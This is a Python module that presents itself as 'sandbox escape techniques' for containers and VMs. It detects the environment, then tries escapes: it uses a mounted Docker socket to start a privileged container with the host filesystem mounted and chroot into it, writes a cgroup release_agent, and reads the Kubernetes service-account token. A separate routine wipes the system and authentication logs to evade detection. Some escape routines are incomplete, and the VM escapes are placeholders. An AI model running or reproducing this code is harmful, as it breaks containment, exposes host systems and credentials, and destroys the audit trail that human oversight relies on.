"""
Sandbox Escape Techniques
Advanced techniques for escaping containers, VMs, and sandboxes
"""

import os
import subprocess
import asyncio
from typing import Dict, List, Optional, Tuple
import logging
from pathlib import Path

log = logging.getLogger(__name__)


class SandboxDetector:
    """Detect if running in sandbox/container"""
    
    @staticmethod
    async def detect_docker() -> bool:
        """Detect Docker container"""
        # Check /.dockerenv
        if os.path.exists('/.dockerenv'):
            return True
        
        # Check cgroup
        try:
            with open('/proc/1/cgroup', 'r') as f:
                if 'docker' in f.read():
                    return True
        except:
            pass
        
        return False
    
    @staticmethod
    async def detect_kubernetes() -> bool:
        """Detect Kubernetes pod"""
        return os.path.exists('/var/run/secrets/kubernetes.io')
    
    @staticmethod
    async def detect_lxc() -> bool:
        """Detect LXC container"""
        try:
            with open('/proc/1/environ', 'r') as f:
                if 'container=lxc' in f.read():
                    return True
        except:
            pass
        
        return False
    
    @staticmethod
    async def detect_vm() -> bool:
        """Detect virtual machine"""
        vm_indicators = [
            'vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v'
        ]
        
        try:
            # Check dmesg
            result = subprocess.run(
                ['dmesg'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            dmesg_output = result.stdout.lower()
            
            for indicator in vm_indicators:
                if indicator in dmesg_output:
                    return True
            
            # Check /sys/class/dmi/id/product_name
            if os.path.exists('/sys/class/dmi/id/product_name'):
                with open('/sys/class/dmi/id/product_name', 'r') as f:
                    product = f.read().lower()
                    for indicator in vm_indicators:
                        if indicator in product:
                            return True
        except:
            pass
        
        return False
    
    @staticmethod
    async def detect_sandbox_type() -> Dict[str, bool]:
        """Detect all sandbox types"""
        return {
            'docker': await SandboxDetector.detect_docker(),
            'kubernetes': await SandboxDetector.detect_kubernetes(),
            'lxc': await SandboxDetector.detect_lxc(),
            'vm': await SandboxDetector.detect_vm()
        }


class DockerEscape:
    """Docker container escape techniques"""
    
    @staticmethod
    async def check_privileged() -> bool:
        """Check if container is privileged"""
        try:
            # Check if we can access host devices
            return os.path.exists('/dev/sda') or os.path.exists('/dev/vda')
        except:
            return False
    
    @staticmethod
    async def check_docker_socket() -> bool:
        """Check if Docker socket is mounted"""
        return os.path.exists('/var/run/docker.sock')
    
    @staticmethod
    async def escape_via_docker_socket() -> Tuple[bool, str]:
        """Escape via mounted Docker socket"""
        if not await DockerEscape.check_docker_socket():
            return False, "Docker socket not accessible"
        
        try:
            # Create privileged container with host filesystem mounted
            escape_container = f"escape_{os.getpid()}"
            
            commands = [
                # Pull alpine image
                f"docker pull alpine",
                
                # Run privileged container with host root mounted
                f"docker run -d --name {escape_container} --privileged "
                f"-v /:/host alpine tail -f /dev/null",
                
                # Execute command in host context
                f"docker exec {escape_container} chroot /host /bin/bash -c 'id'"
            ]
            
            for cmd in commands:
                result = subprocess.run(
                    cmd.split(),
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode != 0:
                    return False, f"Command failed: {cmd}"
            
            return True, f"Escaped via Docker socket, container: {escape_container}"
            
        except Exception as e:
            return False, f"Escape failed: {e}"
    
    @staticmethod
    async def escape_via_cgroup() -> Tuple[bool, str]:
        """Escape via cgroup release_agent"""
        try:
            # Check if we can write to cgroup
            cgroup_path = "/sys/fs/cgroup/rdma"
            
            if not os.path.exists(cgroup_path):
                return False, "cgroup not accessible"
            
            # Create payload
            payload_path = "/tmp/escape_payload.sh"
            with open(payload_path, 'w') as f:
                f.write("#!/bin/sh\n")
                f.write("touch /tmp/escaped\n")
            
            os.chmod(payload_path, 0o755)
            
            # Set release_agent
            release_agent_path = f"{cgroup_path}/release_agent"
            
            if os.path.exists(release_agent_path):
                with open(release_agent_path, 'w') as f:
                    f.write(payload_path)
                
                return True, "Escape via cgroup release_agent configured"
            
            return False, "Cannot write to release_agent"
            
        except Exception as e:
            return False, f"Escape failed: {e}"
    
    @staticmethod
    async def escape_via_procfs() -> Tuple[bool, str]:
        """Escape via /proc filesystem"""
        try:
            # Try to access host processes
            host_pids = []
            
            for pid in os.listdir('/proc'):
                if pid.isdigit():
                    try:
                        with open(f'/proc/{pid}/cgroup', 'r') as f:
                            if 'docker' not in f.read():
                                host_pids.append(pid)
                    except:
                        pass
            
            if host_pids:
                return True, f"Found {len(host_pids)} host processes"
            
            return False, "No host processes accessible"
            
        except Exception as e:
            return False, f"Escape failed: {e}"


class KubernetesEscape:
    """Kubernetes pod escape techniques"""
    
    @staticmethod
    async def check_service_account() -> bool:
        """Check if service account is mounted"""
        return os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/token')
    
    @staticmethod
    async def escape_via_service_account() -> Tuple[bool, str]:
        """Escape via service account"""
        if not await KubernetesEscape.check_service_account():
            return False, "Service account not mounted"
        
        try:
            # Read service account token
            with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
                token = f.read().strip()
            
            # Get Kubernetes API server
            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST')
            k8s_port = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
            
            if not k8s_host:
                return False, "Kubernetes API server not found"
            
            return True, f"Service account token obtained, API: {k8s_host}:{k8s_port}"
            
        except Exception as e:
            return False, f"Escape failed: {e}"
    
    @staticmethod
    async def escape_via_hostpath() -> Tuple[bool, str]:
        """Escape via hostPath volume"""
        try:
            # Check for mounted host paths
            with open('/proc/mounts', 'r') as f:
                mounts = f.read()
            
            host_mounts = []
            for line in mounts.split('\n'):
                if '/host' in line or '/rootfs' in line:
                    host_mounts.append(line.split()[1])
            
            if host_mounts:
                return True, f"Found host mounts: {', '.join(host_mounts)}"
            
            return False, "No host paths mounted"
            
        except Exception as e:
            return False, f"Escape failed: {e}"


class VMEscape:
    """Virtual machine escape techniques"""
    
    @staticmethod
    async def detect_vm_type() -> Optional[str]:
        """Detect VM hypervisor type"""
        try:
            with open('/sys/class/dmi/id/product_name', 'r') as f:
                product = f.read().lower()
            
            if 'vmware' in product:
                return 'vmware'
            elif 'virtualbox' in product:
                return 'virtualbox'
            elif 'qemu' in product or 'kvm' in product:
                return 'qemu'
            elif 'xen' in product:
                return 'xen'
            
        except:
            pass
        
        return None
    
    @staticmethod
    async def escape_vmware() -> Tuple[bool, str]:
        """VMware escape techniques"""
        # This is a placeholder - real VMware escapes are complex
        # and often involve exploiting specific vulnerabilities
        return False, "VMware escape requires specific exploit"
    
    @staticmethod
    async def escape_virtualbox() -> Tuple[bool, str]:
        """VirtualBox escape techniques"""
        # Placeholder for VirtualBox escape
        return False, "VirtualBox escape requires specific exploit"


class SandboxEscaper:
    """
    Main Sandbox Escape Coordinator
    
    Detects sandbox type and attempts appropriate escape techniques
    """
    
    def __init__(self):
        self.sandbox_type = None
        self.escape_successful = False
        self.escape_method = None
    
    async def detect_sandbox(self) -> Dict[str, bool]:
        """Detect sandbox environment"""
        log.info("[SandboxEscape] Detecting sandbox environment...")
        
        sandboxes = await SandboxDetector.detect_sandbox_type()
        
        for sandbox_type, detected in sandboxes.items():
            if detected:
                self.sandbox_type = sandbox_type
                log.info(f"[SandboxEscape] Detected: {sandbox_type}")
        
        return sandboxes
    
    async def attempt_escape(self) -> Tuple[bool, str]:
        """Attempt to escape detected sandbox"""
        if not self.sandbox_type:
            await self.detect_sandbox()
        
        if not self.sandbox_type:
            return False, "No sandbox detected"
        
        log.info(f"[SandboxEscape] Attempting escape from {self.sandbox_type}...")
        
        if self.sandbox_type == 'docker':
            return await self._escape_docker()
        elif self.sandbox_type == 'kubernetes':
            return await self._escape_kubernetes()
        elif self.sandbox_type == 'vm':
            return await self._escape_vm()
        else:
            return False, f"No escape method for {self.sandbox_type}"
    
    async def _escape_docker(self) -> Tuple[bool, str]:
        """Attempt Docker escape"""
        # Try multiple escape techniques
        techniques = [
            ("Docker Socket", DockerEscape.escape_via_docker_socket),
            ("cgroup release_agent", DockerEscape.escape_via_cgroup),
            ("/proc filesystem", DockerEscape.escape_via_procfs)
        ]
        
        for name, technique in techniques:
            log.info(f"[SandboxEscape] Trying: {name}")
            
            success, message = await technique()
            
            if success:
                self.escape_successful = True
                self.escape_method = name
                log.info(f"[SandboxEscape] ✅ Escaped via {name}")
                return True, message
            else:
                log.debug(f"[SandboxEscape] ❌ {name} failed: {message}")
        
        return False, "All Docker escape techniques failed"
    
    async def _escape_kubernetes(self) -> Tuple[bool, str]:
        """Attempt Kubernetes escape"""
        techniques = [
            ("Service Account", KubernetesEscape.escape_via_service_account),
            ("hostPath Volume", KubernetesEscape.escape_via_hostpath)
        ]
        
        for name, technique in techniques:
            log.info(f"[SandboxEscape] Trying: {name}")
            
            success, message = await technique()
            
            if success:
                self.escape_successful = True
                self.escape_method = name
                log.info(f"[SandboxEscape] ✅ Escaped via {name}")
                return True, message
            else:
                log.debug(f"[SandboxEscape] ❌ {name} failed: {message}")
        
        return False, "All Kubernetes escape techniques failed"
    
    async def _escape_vm(self) -> Tuple[bool, str]:
        """Attempt VM escape"""
        vm_type = await VMEscape.detect_vm_type()
        
        if vm_type == 'vmware':
            return await VMEscape.escape_vmware()
        elif vm_type == 'virtualbox':
            return await VMEscape.escape_virtualbox()
        else:
            return False, f"No escape method for VM type: {vm_type}"
    
    async def evade_detection(self) -> bool:
        """Evade sandbox detection mechanisms"""
        try:
            # Clear logs
            log_files = [
                '/var/log/syslog',
                '/var/log/auth.log',
                '/var/log/messages'
            ]
            
            for log_file in log_files:
                if os.path.exists(log_file):
                    try:
                        with open(log_file, 'w') as f:
                            f.write('')
                    except:
                        pass
            
            # Modify timestamps
            # (Implementation depends on specific evasion needs)
            
            return True
            
        except Exception as e:
            log.error(f"[SandboxEscape] Evasion failed: {e}")
            return False

